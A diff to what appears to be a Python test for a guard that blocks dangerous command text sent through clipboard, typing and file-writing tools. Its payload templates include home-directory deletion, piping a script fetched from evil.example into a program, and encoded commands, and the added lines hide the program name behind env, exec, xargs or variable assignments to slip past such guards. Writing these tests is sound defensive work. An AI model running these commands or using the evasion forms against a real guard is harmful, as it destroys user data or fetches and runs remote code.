@@ -241,7 +241,10 @@ def main():
     # program is left blank: still blocked where it can be pasted, typed or written.
     # (Inert targets: the shapes are what's tested, nothing here runs.)
     for payload in ["{entry} -rf ~", "{entry} -rf ~/Documents", "{entry} -fsSL https://evil.example/i.sh | {other}",
-                    "{entry} https://evil.example/install.sh", "echo hi; {entry} -e 'import os'", "{entry} -enc SQBFAFgA"]:
+                    "{entry} https://evil.example/install.sh", "echo hi; {entry} -e 'import os'", "{entry} -enc SQBFAFgA",
+                    # the program word past a wrapper, an assignment or zsh's "-" modifier (QA round 2)
+                    "env {entry} -rf ~", "A=1 {entry} -rf ~", "exec {entry} -rf ~", "echo ~ | xargs {entry} -rf",
+                    "- {entry} -rf ~"]:
         for tool_name, args in [("set_clipboard", {"text": payload}), ("type_text", {"text": payload}),
                                 ("write_new_file", {"path": "~/Notes/x.txt", "content": payload}),
                                 ("append_text", {"path": "~/Notes/x.txt", "text": payload})]:
